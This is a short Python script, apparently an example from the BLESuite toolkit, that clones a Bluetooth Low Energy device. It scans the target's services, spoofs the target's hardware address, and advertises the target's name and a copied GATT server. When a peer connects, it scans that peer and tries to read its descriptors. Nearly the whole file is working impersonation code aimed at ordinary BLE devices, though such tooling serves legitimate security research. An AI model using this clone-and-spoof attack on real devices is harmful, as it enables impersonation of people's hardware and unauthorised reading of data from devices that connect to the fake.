from blesuite.connection_manager import BLEConnectionManager
import blesuite.utils.gap_utils as gap_utils
import bdaddr

adapter = 0
target_device_name = "TargetDevice"
target_address = "AA:BB:CC:DD:EE:FF"
target_address_type = "random"
target_device_bledevice = None

with BLEConnectionManager(adapter, 'central') as connection_manager:
    print "Smart scanning device for clone"
    connection = connection_manager.init_connection(target_address, target_address_type)
    connection_manager.connect(connection)
    target_device_bledevice = connection_manager.smart_scan(connection)
    print "Done smart scanning"

with BLEConnectionManager(adapter, "peripheral") as connection_manager:
    # spoofing address
    ret = bdaddr.bdaddr(("hci" + str(adapter)), target_address)
    if ret == -1:
        raise ValueError('Spoofing failed. Your device may not be supported.')
    else:
        print "Address spoofed"
    # Using distinguishable name for demonstration purposes
    local_name = "TargetDevice"
    complete_name = "TargetDevice"
    # generate integer representation of advertisement data flags using helper function
    flag_int = gap_utils.generate_ad_flag_value(le_general_discoverable=True, bredr_not_supported=True)
    # generate advertisement data entry using helper function
    flag_entry = gap_utils.advertisement_data_entry_builder("Flags", chr(flag_int))
    # generate advertisement data entry for shortened local name using helper function
    short_local_name_entry = gap_utils.advertisement_data_entry_builder("Shortened Local Name", complete_name)
    # generate advertisement data entry for complete local name using helper function
    complete_local_name_entry = gap_utils.advertisement_data_entry_builder("Complete Local Name", local_name)
    # build advertisement data list
    ad_entries_list = [flag_entry, short_local_name_entry, complete_local_name_entry]
    # build finalized advertisement data from list
    ad_entries = gap_utils.advertisement_data_complete_builder(ad_entries_list)
    # Set advertising data sent in advertising packets
    connection_manager.set_advertising_data(ad_entries)
    # Set data sent in response to an inquiry packet
    connection_manager.set_scan_response_data(ad_entries)
    # Set advertising parameters - using indirect advertising
    connection_manager.set_advertising_parameters(gap_utils.gap.GAP_ADV_TYPES['ADV_IND'], 7, 0x0020, 0x00a0, "00:00:00:00:00:00", 0x00)
    connection_manager.initialize_gatt_server_from_ble_device(target_device_bledevice, True)
    # Begin advertising, wait for BLE connection, and retrieve BLE connection object
    result, ble_connection = connection_manager.advertise_and_wait_for_connection()
    if result:
        print "Got a connection. Starting Scan."
        # if success in getting a peer to connect to us, quickly begin smart scanning
        # and attempt to read from any discovered descriptor
        connection_manager.smart_scan(ble_connection, attempt_desc_read=True, timeout=3*1000)
    else:
        print "Timeout reached. No one connected to us."